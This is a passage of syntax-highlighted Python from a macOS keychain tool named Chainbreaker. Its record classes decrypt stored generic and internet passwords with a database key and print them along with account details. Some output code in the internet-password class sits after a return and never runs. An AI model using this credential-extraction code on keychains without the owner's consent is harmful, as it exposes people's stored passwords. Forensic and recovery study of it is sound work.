</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; [-] Print Name: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>PrintName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#34; [-] Alias: %s\n&#34; % self.Alias</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#34; [-] Subject: %s\n&#34; % self.Subject</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#34; [-] Issuer: %s\n&#34; % self.Issuer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#34; [-] Serial Number: %s\n&#34; % self.Serial_Number</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#34; [-] Subject Key Identifier: %s\n&#34; % self.Subject_Key_Identifier</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># output += &#34; [-] Public Key Hash: %s\n&#34; % self.Public_Key_Hash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; [-] Certificate: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> base64<span style="color:#f92672">.</span>b64encode(self<span style="color:#f92672">.</span>Certificate)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exportable</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>Certificate
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FileName</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>PrintName <span style="color:#66d9ef">if</span> x<span style="color:#f92672">.</span>isalnum())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FileExt</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;.crt&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SSGBEncryptedRecord</span>(KeychainRecord):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>_password <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>password_b64_encoded <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Chainbreaker<span style="color:#f92672">.</span>KeychainRecord<span style="color:#f92672">.</span>__init__(self)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_password</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>SSGP <span style="color:#f92672">and</span> self<span style="color:#f92672">.</span>DBKey:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>_password <span style="color:#f92672">=</span> Chainbreaker<span style="color:#f92672">.</span>_kcdecrypt(self<span style="color:#f92672">.</span>DBKey, self<span style="color:#f92672">.</span>SSGP<span style="color:#f92672">.</span>IV, self<span style="color:#f92672">.</span>SSGP<span style="color:#f92672">.</span>EncryptedPassword)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> all(c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>_password):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        self<span style="color:#f92672">.</span>_password <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(self<span style="color:#f92672">.</span>_password)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        self<span style="color:#f92672">.</span>password_b64_encoded <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>_password:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>_password <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_password_output_str</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            password <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>Password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>password_b64_encoded:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39; [-] Base64 Encoded Password: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(password)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39; [-] Password: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(password)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">Password</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>_password:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>decrypt_password()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>locked:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>_password <span style="color:#f92672">=</span> Chainbreaker<span style="color:#f92672">.</span>KEYCHAIN_LOCKED_SIGNATURE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>_password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exportable</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>__str__()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FileName</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(x <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>PrintName <span style="color:#66d9ef">if</span> x<span style="color:#f92672">.</span>isalnum())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@property</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">FileExt</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;.txt&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GenericPasswordRecord</span>(SSGBEncryptedRecord):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __init__(self, created<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, last_modified<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, description<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, creator<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, type<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, print_name<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                     alias<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, account<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, service<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, ssgp<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, dbkey<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Created <span style="color:#f92672">=</span> created
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>LastModified <span style="color:#f92672">=</span> last_modified
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Description <span style="color:#f92672">=</span> description
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Creator <span style="color:#f92672">=</span> creator
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Type <span style="color:#f92672">=</span> type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>PrintName <span style="color:#f92672">=</span> print_name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Alias <span style="color:#f92672">=</span> alias
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Account <span style="color:#f92672">=</span> account
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Service <span style="color:#f92672">=</span> service
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Key <span style="color:#f92672">=</span> key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>SSGP <span style="color:#f92672">=</span> ssgp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>SSGPLabel <span style="color:#f92672">=</span> ssgp<span style="color:#f92672">.</span>Label <span style="color:#66d9ef">if</span> ssgp <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>DBKey <span style="color:#f92672">=</span> dbkey
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Chainbreaker<span style="color:#f92672">.</span>SSGBEncryptedRecord<span style="color:#f92672">.</span>__init__(self)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __str__(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[+] Generic Password Record</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Create DateTime: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Created
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Last Modified DateTime: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>LastModified
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Description: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Description
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Creator: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Creator
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Print Name: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>PrintName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Alias: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Alias
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Account: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Account
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Service: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Service
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>get_password_output_str()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>SSGPLabel:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] SSGP Label: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hexlify(self<span style="color:#f92672">.</span>SSGPLabel))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] SSGP Label: None</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Record DBKey: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hexlify(self<span style="color:#f92672">.</span>DBKey)) <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>DBKey <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39; [-] Record DBKey: None</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">InternetPasswordRecord</span>(SSGBEncryptedRecord):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __init__(self, created<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, last_modified<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, description<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, comment<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, creator<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, type<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                     print_name<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, alias<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, protected<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, account<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, security_domain<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, server<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                     protocol_type<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, auth_type<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, port<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, path<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, ssgp<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, dbkey<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Created <span style="color:#f92672">=</span> created
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>LastModified <span style="color:#f92672">=</span> last_modified
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Description <span style="color:#f92672">=</span> description
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Comment <span style="color:#f92672">=</span> comment
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Creator <span style="color:#f92672">=</span> creator
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Type <span style="color:#f92672">=</span> type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>PrintName <span style="color:#f92672">=</span> print_name
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Alias <span style="color:#f92672">=</span> alias
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Protected <span style="color:#f92672">=</span> protected
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Account <span style="color:#f92672">=</span> account
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>SecurityDomain <span style="color:#f92672">=</span> security_domain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Server <span style="color:#f92672">=</span> server
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>ProtocolType <span style="color:#f92672">=</span> protocol_type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>AuthType <span style="color:#f92672">=</span> auth_type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Port <span style="color:#f92672">=</span> port
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>Path <span style="color:#f92672">=</span> path
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>SSGP <span style="color:#f92672">=</span> ssgp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>DBKey <span style="color:#f92672">=</span> dbkey
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            Chainbreaker<span style="color:#f92672">.</span>SSGBEncryptedRecord<span style="color:#f92672">.</span>__init__(self)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">def</span> __str__(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[+] Generic Password Record</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Create DateTime: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Created
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Last Modified DateTime: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>LastModified
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Description: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Description
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Creator: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Creator
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Type
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Print Name: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>PrintName
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Alias: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Alias
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Account: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Account
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Service: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> self<span style="color:#f92672">.</span>Service
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> self<span style="color:#f92672">.</span>get_password_output_str()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Record DBKey: </span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(hexlify(self<span style="color:#f92672">.</span>DBKey)) <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>DBKey <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39; [-] Record DBKey: None</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> output
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39; [-] Protocol Type: </span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> PROTOCOL_TYPE[self<span style="color:#f92672">.</span>ProtocolType]
</span></span><span style="display:flex;"><span>
